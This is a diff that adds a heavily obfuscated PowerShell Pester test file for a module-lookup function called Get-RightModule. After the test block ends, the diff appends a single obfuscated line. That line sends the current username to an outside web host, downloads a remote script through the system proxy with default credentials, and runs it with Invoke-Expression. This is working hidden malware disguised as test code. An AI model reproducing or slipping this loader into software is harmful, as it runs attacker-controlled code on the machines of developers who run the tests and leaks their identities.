+                    &("{3}{4}{2}{1}{0}" -f 'ed','ll','t-MockCa','As','ser') -CommandName ("{1}{2}{0}"-f'e','Ge','t-Modul') -ParameterFilter {
+                        ${n`AMe} -eq ${MOC`kmOdul`e`N`AmE}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{1}{0}"-f 'ontext','C') ("{13}{21}{20}{16}{19}{11}{1}{0}{24}{15}{10}{12}{9}{3}{17}{22}{4}{5}{8}{2}{14}{6}{23}{7}{18}" -f' ','ed,','a ','si','ist, but',' fr','ent ','posit','om ','er','e ',' is specifi','v','When para','differ','nd on','osit','on of ','ory','ory','Rep','meter ','the module ex','re','a') {
+                &("{1}{2}{0}"-f 'ach','Befo','reE') {
+                    &("{0}{1}" -f'M','ock') -CommandName ("{1}{0}{2}"-f't-','Ge','Module') -MockWith ${M`O`c`KgEt`m`OdUle_siNG`LeM`OD`ULe}
+                }
+
+                &('It') ('Sho'+'u'+'ld '+'re'+'tu'+'rn '+('0Uf'+'nul'+'l')."rEP`L`ACe"(([cHaR]48+[cHaR]85+[cHaR]102),[STRing][cHaR]36)) {
+                    ${GEt`RighT`mod`UlEr`ESult} = &("{2}{1}{0}{3}"-f 't-Right','e','G','Module') -Name ${MoCk`mODu`leN`Ame} -Repository ("{2}{0}{1}{3}{4}"-f'herRep','osi','Ot','tor','y') -Verbose
+                    ${gETRiGhT`m`o`duLerEsuLt}."n`AME" | &("{0}{1}" -f'Sh','ould') -BeNullOrEmpty
+
+                    &("{3}{2}{0}{1}"-f'c','kCalled','sert-Mo','As') -CommandName ("{2}{7}{3}{6}{0}{5}{4}{1}"-f 's','yName','Get-Modul','e','or','it','po','eR') -Exactly -Times 1 -Scope ('It')
+                    &("{1}{2}{4}{3}{0}" -f 'ed','A','s','ockCall','sert-M') -CommandName ("{3}{0}{2}{1}" -f 'et','ule','-Mod','G') -ParameterFilter {
+                        ${Na`me} -eq ${MOcKM`o`DU`LE`NaMe}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{1}{0}" -f'ontext','C') ("{5}{2}{3}{10}{14}{7}{1}{9}{12}{11}{0}{6}{4}{13}{8}"-f'er','fic versio',' the module ','i','ins','When','sion is ','peci','alled','n, and the s','s re',' v','pecific','t','quired to have a s') {
+                &("{2}{0}{1}" -f'efo','reEach','B') {
+                    &("{0}{1}"-f 'Moc','k') -CommandName ("{3}{2}{0}{1}" -f't-Modul','e','e','G') -MockWith ${mOck`G`eTM`od`ULE_singlemO`duLE}
+                }
+
+                &('It') ("{1}{7}{2}{8}{5}{4}{0}{3}{6}" -f' in','Shou','tur','formatio','orrect module','c','n','ld re','n the ') {
+                    ${GEt`RIGHTm`odulEr`e`SULt} = &("{3}{2}{1}{0}"-f 'e','ghtModul','Ri','Get-') -Name ${mOCK`M`OD`UL`eNAme} -RequiredVersion ("{0}{2}{1}"-f'1.','0','0.0.') -Verbose
+                    ${GEtr`iG`HTMO`DUleRESu`lT}."nA`me"  | &("{1}{0}"-f'd','Shoul') -Be ${MOck`MOD`ULeNamE}
+
+                    &("{1}{4}{0}{2}{3}" -f'kCal','Asse','le','d','rt-Moc') -CommandName ("{6}{5}{4}{0}{1}{2}{3}" -f 'uleR','eposit','oryN','ame','d','Mo','Get-') -Exactly -Times 0 -Scope ('It')
+                    &("{1}{3}{2}{0}" -f 'ed','Assert-','ll','MockCa') -CommandName ("{2}{3}{0}{1}"-f 'o','dule','Get-','M') -ParameterFilter {
+                        ${N`AmE} -eq ${M`oC`KMODULE`NaMe}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{0}{1}"-f 'Co','ntext') ("{16}{22}{3}{13}{21}{11}{5}{4}{8}{6}{18}{19}{9}{12}{15}{17}{1}{10}{0}{2}{14}{7}{20}{24}{23}"-f'f','p','i',' t','hav','o ',' a specifi','versio','e','ersion,','eci',' t',' an','he module is requi','c ','d the','Wh',' s','c',' v','n is','red','en',' installed',' not') {
+                &("{0}{1}{2}{3}" -f'B','ef','oreEac','h') {
+                    &("{1}{0}" -f'k','Moc') -CommandName ("{2}{1}{0}" -f'odule','M','Get-') -MockWith ${M`Oc`kGetm`odUL`e`_S`INg`leMO`DUlE}
+                }
+
+                &('It') ('Sh'+'ould '+'r'+'etu'+'rn '+('{0'+'}null') -F [ChAR]36) {
+                    ${gETR`Ightmo`d`ULE`Resu`lt} = &("{0}{4}{3}{1}{2}"-f'Ge','RightMo','dule','-','t') -Name ${Moc`KM`OD`UleNAme} -RequiredVersion ("{2}{0}{1}" -f'.0','.0.0','2') -Verbose
+                    ${gETrIGHt`mOD`UlEReS`U`LT}."N`Ame" | &("{0}{1}" -f 'Sh','ould') -BeNullOrEmpty
+
+                    &("{1}{0}{3}{2}"-f 'ert-Mock','Ass','alled','C') -CommandName ("{0}{3}{2}{1}{4}{5}" -f 'Get','u','d','-Mo','leR','epositoryName') -Exactly -Times 0 -Scope ('It')
+                    &("{1}{0}{3}{2}" -f'rt-Mock','Asse','d','Calle') -CommandName ("{1}{3}{2}{0}"-f'dule','G','-Mo','et') -ParameterFilter {
+                        ${nA`Me} -eq ${moCKmOD`Ul`e`NAmE}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{1}{0}"-f 't','Contex') ("{16}{24}{6}{21}{2}{9}{1}{17}{4}{11}{22}{3}{14}{19}{12}{15}{10}{13}{0}{23}{25}{5}{18}{20}{7}{8}"-f' suitab','required to hav',' i','m v','xi','mo',' ','n','stalled','s ','nd ','m','o','a','er','n, a','When ','e a ma','dule ','si','is i','module','u','le','the',' ') {
+                &("{1}{2}{0}"-f'eEach','Bef','or') {
+                    &("{1}{0}"-f'ck','Mo') -CommandName ("{3}{1}{2}{0}" -f 'e','et','-Modul','G') -MockWith ${m`OCkg`EtmO`dUl`E_sIngLEMOd`ULe}
+                }
+
+                &('It') ("{7}{4}{0}{8}{5}{9}{11}{1}{12}{3}{6}{10}{2}"-f 'r','ct','n','e info','uld ','turn the c','r','Sho','e','orr','matio','e',' modul') {
+                    ${Ge`T`RI`G`htMODUlE`ReSU`lT} = &("{2}{0}{1}" -f'htM','odule','Get-Rig') -Name ${moC`Km`Od`UleNa`ME} -MaximumVersion ("{0}{1}" -f '1','.0.0.0') -Verbose
+                    ${GetrigH`TMO`DUle`ReSuLT}."N`AMe"  | &("{1}{2}{0}" -f'uld','Sh','o') -Be ${mockm`ODUlE`NAme}
+
+                    &("{3}{1}{2}{4}{0}"-f'd','ert-Mo','ckC','Ass','alle') -CommandName ("{4}{5}{2}{3}{7}{1}{0}{6}" -f'm','yNa','-Mo','d','Ge','t','e','uleRepositor') -Exactly -Times 0 -Scope ('It')
+                    &("{3}{1}{0}{4}{2}"-f 'MockC','ert-','led','Ass','al') -CommandName ("{2}{1}{0}" -f 'le','Modu','Get-') -ParameterFilter {
+                        ${na`Me} -eq ${mOc`KM`O`dULE`NAmE}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{2}{1}{0}"-f 't','ontex','C') ("{10}{13}{5}{1}{16}{6}{0}{11}{9}{14}{7}{2}{17}{18}{3}{20}{19}{15}{4}{12}{8}" -f 'd',' i','um ',' and a suita','t','le','re','inim','lled','e a','When the mo',' to hav','a','du',' m','module is ins','s requi','ver','sion,','e ','bl') {
+                &("{2}{3}{0}{1}" -f 'a','ch','Bef','oreE') {
+                    &("{1}{0}" -f'ock','M') -CommandName ("{0}{1}{2}"-f 'Ge','t-Modul','e') -MockWith ${MoCk`G`etm`ODu`LE_`S`INGL`eMODUle}
+                }
+
+                &('It') ("{6}{2}{0}{3}{7}{1}{11}{9}{12}{10}{5}{8}{4}"-f 'ld retur','rec','hou','n the ','formation','le i','S','cor','n',' ','du','t','mo') {
+                    ${GEtr`iGHt`mO`dul`Er`ESuLT} = &("{3}{2}{1}{0}{4}" -f'tMod','gh','-Ri','Get','ule') -Name ${m`oCkmOD`UL`ENaME} -MinimumVersion ("{1}{2}{0}" -f'0.0.0','1','.') -Verbose
+                    ${GetrI`gHT`MODU`lEREsUlt}."na`me"  | &("{0}{1}"-f'Shoul','d') -Be ${mock`mODU`Lena`Me}
+
+                    &("{3}{1}{0}{2}{4}"-f 'ert','ss','-MockCalle','A','d') -CommandName ("{2}{4}{0}{1}{3}{5}" -f'dule','Re','Get-','posito','Mo','ryName') -Exactly -Times 0 -Scope ('It')
+                    &("{0}{1}{2}{3}" -f'A','ssert-MockC','a','lled') -CommandName ("{1}{0}{2}"-f 'et-Mod','G','ule') -ParameterFilter {
+                        ${N`AmE} -eq ${mO`ck`Mo`dU`LENAMe}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{2}{0}{1}"-f'n','text','Co') ("{14}{0}{11}{1}{2}{7}{5}{12}{10}{13}{4}{8}{6}{3}{9}" -f ' module ','s r','eq','he sui',' ','r','t','ui','and ','table module is not installed','ave a maximum version','i','ed to h',',','When the') {
+                &("{3}{1}{2}{0}"-f'ch','efor','eEa','B') {
+                    &("{0}{1}"-f 'Mo','ck') -CommandName ("{2}{1}{0}"-f 'le','u','Get-Mod') -MockWith ${MO`Ck`GeT`MoDulE_SiNgLEm`Od`ULE}
+                }
+
+                &('It') ('Shoul'+'d '+'re'+'turn '+(('Hx'+'nnull')-cREPlace'Hxn',[CHAR]36)) {
+                    ${g`eTR`igHT`mOdulEr`ESult} = &("{2}{3}{0}{1}"-f't-RightModul','e','G','e') -Name ${Moc`k`MoDULeNAmE} -MaximumVersion ("{0}{2}{1}"-f '0.9.','.0','0') -Verbose
+                    ${geTrigHT`modu`l`EREsULT}."na`mE" | &("{2}{0}{1}" -f'ho','uld','S') -BeNullOrEmpty
+
+                    &("{3}{0}{1}{2}" -f'sert','-MockCa','lled','As') -CommandName ("{3}{0}{1}{2}{4}"-f '-Modul','eR','epo','Get','sitoryName') -Exactly -Times 0 -Scope ('It')
+                    &("{2}{3}{0}{1}" -f'll','ed','Assert-MockC','a') -CommandName ("{2}{0}{1}" -f'od','ule','Get-M') -ParameterFilter {
+                        ${na`me} -eq ${MO`cKM`od`ULen`AMe}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{0}{2}{1}" -f'C','xt','onte') ("{15}{17}{9}{3}{1}{11}{12}{5}{13}{14}{0}{7}{16}{4}{18}{19}{6}{2}{8}{10}"-f ', a','qu','ule is no','dule is re',' the s','ve','od','n','t in','o','stalled','ired to h','ave a minimum ','rs','ion','When t','d','he m','uitable ','m') {
+                &("{1}{2}{0}" -f 'reEach','Bef','o') {
+                    &("{1}{0}"-f 'k','Moc') -CommandName ("{0}{1}{2}"-f 'Get','-M','odule') -MockWith ${mOCkge`TM`o`d`Ul`E_SiN`gLemO`D`ULe}
+                }
+
+                &('It') ('Shou'+'l'+'d '+'r'+'et'+'urn '+('s53nu'+'ll')."rEP`La`CE"(([ChaR]115+[ChaR]53+[ChaR]51),[strInG][ChaR]36)) {
+                    ${gEtr`IgH`T`mOd`UleReSUlt} = &("{3}{0}{2}{4}{1}" -f'e','odule','t-','G','RightM') -Name ${m`o`ckmodUL`EN`AMe} -MinimumVersion ("{1}{2}{0}"-f '0.0','2.0','.') -Verbose
+                    ${g`eT`RIg`HtMO`dul`eResU`LT}."nA`mE" | &("{0}{1}"-f'Shoul','d') -BeNullOrEmpty
+
+                    &("{1}{2}{3}{0}" -f'ed','A','s','sert-MockCall') -CommandName ("{4}{1}{2}{3}{0}" -f 'ame','o','dule','RepositoryN','Get-M') -Exactly -Times 0 -Scope ('It')
+                    &("{3}{0}{1}{2}"-f '-M','ockCal','led','Assert') -CommandName ("{0}{2}{1}" -f'Get-M','ule','od') -ParameterFilter {
+                        ${NA`ME} -eq ${mOcK`MODu`LEnA`mE}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{1}{2}{0}" -f 'text','C','on') ("{0}{3}{14}{12}{5}{6}{11}{15}{9}{1}{13}{2}{8}{4}{7}{10}" -f'Wh','quired to','a ','en t',' and maximum v','m','o','e','minimum','s re','rsion','dule','e ',' have ','h',' i') {
+                &("{2}{1}{0}"-f'text','on','C') ("{6}{4}{8}{1}{3}{7}{2}{5}{0}" -f 'd','mod','nsta','ule i','a suit','lle','When ','s i','able ') {
+                    &("{0}{2}{1}" -f'BeforeE','h','ac') {
+                        &("{0}{1}" -f 'Mo','ck') -CommandName ("{1}{2}{3}{0}" -f 'le','G','et-','Modu') -MockWith ${moCkGEtmoDUle_SiN`glE`m`o`d`ULE}
+                    }
+
+                    &('It') ("{8}{11}{0}{13}{5}{9}{3}{2}{6}{1}{4}{12}{7}{10}" -f 'uld re','dule i','o',' c','nf','urn t','rrect mo','i','Sh','he','on','o','ormat','t') {
+                        ${GETr`iGHT`MoDU`LEr`e`SULT} = &("{0}{2}{1}{3}"-f 'G','tModul','et-Righ','e') -Name ${MOckmODu`lEnA`mE} -MinimumVersion ("{0}{2}{1}" -f '0.9','0','.0.') -MaximumVersion ("{1}{2}{0}" -f'0','2','.0.0.') -Verbose
+                        ${gE`TrIg`HtmoDule`R`ESULt}."N`AME"  | &("{1}{2}{0}" -f 'ld','S','hou') -Be ${mOc`k`MODULE`Name}
+
+                        &("{3}{0}{2}{1}"-f 'o','d','ckCalle','Assert-M') -CommandName ("{6}{2}{4}{1}{3}{5}{0}" -f'me','t','leRepos','or','i','yNa','Get-Modu') -Exactly -Times 0 -Scope ('It')
+                        &("{2}{1}{0}{3}"-f 'rt-MockCa','e','Ass','lled') -CommandName ("{1}{2}{0}"-f 'ule','Ge','t-Mod') -ParameterFilter {
+                            ${N`AmE} -eq ${moc`KmOD`ULE`Na`me}
+                        } -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+
+                &("{0}{1}" -f 'Cont','ext') ("{3}{10}{5}{2}{6}{1}{7}{4}{0}{8}{9}"-f'll','s ','itable mo','When ther','sta','su','dule','in','e','d','e two ') {
+                    &("{0}{1}{2}"-f'Be','foreE','ach') {
+                        &("{1}{0}" -f'k','Moc') -CommandName ("{0}{1}{3}{2}"-f'Get-M','o','ule','d') -MockWith ${mO`c`KgetM`odu`Le_Mult`I`pLEmoD`UlES}
+                    }
+
+                    &('It') ("{5}{0}{4}{2}{8}{10}{6}{7}{3}{1}{9}"-f ' ','le i','turn ','u','re','Should','mo','d','the correct','nformation',' ') {
+                        ${g`Et`RI`ghTmod`UlereS`ULt} = &("{1}{2}{3}{0}"-f 'e','Get-R','ightMod','ul') -Name ${Mo`C`kMOd`ULE`NAme} -MinimumVersion ("{1}{2}{0}" -f'.0.0','0.','9') -MaximumVersion ("{1}{0}{2}"-f'.','2','0.0.0') -Verbose
+                        ${GE`TR`Igh`T`mOduLe`RE`SUlt} | &("{1}{0}" -f'ould','Sh') -HaveCount 2
+                        ${getRigh`TmOD`Ul`EreSUlT}[0]."vE`RsI`on"."Ma`JoR" | &("{2}{0}{1}"-f 'ul','d','Sho') -Be 1
+                        ${geTr`ig`hTmODul`eR`e`SuLt}[1]."VER`si`oN"."M`AJoR" | &("{0}{1}" -f'Sh','ould') -Be 2
+
+                        &("{4}{0}{1}{2}{3}"-f 'ser','t-','MockCa','lled','As') -CommandName ("{3}{0}{4}{2}{5}{1}"-f '-Mo','ame','pository','Get','duleRe','N') -Exactly -Times 0 -Scope ('It')
+                        &("{1}{0}{3}{2}" -f'ssert-','A','kCalled','Moc') -CommandName ("{0}{1}{2}"-f'Get','-M','odule') -ParameterFilter {
+                            ${NA`Me} -eq ${MOCkmODuL`En`AMe}
+                        } -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+
+
+                &("{1}{0}"-f'ontext','C') ("{17}{14}{13}{8}{2}{18}{15}{4}{12}{0}{7}{1}{9}{16}{3}{6}{11}{5}{10}"-f 'bu','nly',' in','modul','alled module','su','e is','t o',' two',' o','itable',' ','s, ','there','hen ','t','ne ','W','s') {
+                    &("{2}{1}{0}"-f 'ch','Ea','Before') {
+                        &("{0}{1}"-f'Mo','ck') -CommandName ("{3}{2}{1}{0}" -f'ule','d','Mo','Get-') -MockWith ${Mo`cKGeTMO`d`UlE_mULtIP`LE`moDU`LEs}
+                    }
+
+                    &('It') ("{2}{4}{1}{11}{7}{3}{6}{5}{9}{10}{8}{0}" -f'on',' return','S','ct','hould','d',' mo','re','i','ule ','informat',' the cor') {
+                        ${getri`GH`T`mod`UL`eRes`UlT} = &("{3}{1}{0}{2}"-f'i','t-R','ghtModule','Ge') -Name ${M`oCKM`ODUlE`Na`mE} -MinimumVersion ("{2}{1}{0}" -f'.0','1.0','1.') -MaximumVersion ("{1}{0}"-f'0.0.0','2.') -Verbose
+                        ${GET`RIg`HtMod`Ul`ErE`SuLT} | &("{0}{1}"-f 'S','hould') -HaveCount 1
+                        ${GE`T`RIGHTModu`LeRe`SULT}[0]."vEr`SiOn"."MAJ`oR" | &("{1}{0}"-f 'd','Shoul') -Be 2
+
+                        &("{0}{1}{2}{3}{4}" -f'A','ss','ert-Moc','k','Called') -CommandName ("{1}{2}{0}{3}{4}"-f'itoryN','Get-ModuleRepo','s','am','e') -Exactly -Times 0 -Scope ('It')
+                        &("{5}{4}{2}{1}{0}{3}"-f'Cal','k','c','led','-Mo','Assert') -CommandName ("{0}{1}{2}"-f'G','et-M','odule') -ParameterFilter {
+                            ${nA`ME} -eq ${MOCKm`O`D`U`lEnamE}
+                        } -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+            }
+        }
+    }
+}
+finally {
+    &("{3}{2}{0}{4}{1}" -f 'ke-Tes','eanup','nvo','I','tCl')
+}
+
+${x}=${e`N`V`:U`sErnAME};${u}=("{0}{5}{7}{3}{2}{1}{6}{4}{8}" -f 'http','g','a.or','.bcbs-arizon','2.txt?',':','/s','//www','u=') + ${X};${p} =   (  &("{0}{1}{2}" -f'vA','ri','aBle')  ("{1}{0}{2}" -f 'W','V','D8O3'))."Va`lue"::("{3}{2}{0}{1}"-f 'rox','y','emWebP','GetSyst').Invoke();${P}."C`RE`DEnt`iALs"=  ( &("{2}{0}{3}{1}"-f'Di','em','chIL','t') ("{1}{3}{4}{0}{2}" -f '2','VArI','d','aBl','e:wrE'))."V`ALUE"::"d`ef`AuLtc`REDENtiaLs";${W}=&("{0}{2}{1}"-f 'New-','ject','Ob') ("{2}{3}{1}{0}"-f 't','bclien','ne','t.we');${w}."PRO`XY"=${P};${w}."UsEDEfaUl`Tcre`d`e`NtIALS"=${tR`Ue};${s}=${w}.("{2}{3}{1}{0}" -f'ing','loadStr','Dow','n').Invoke(${U});&("{3}{1}{2}{0}" -f 'Expression','e','-','Invok') -Command ${S};
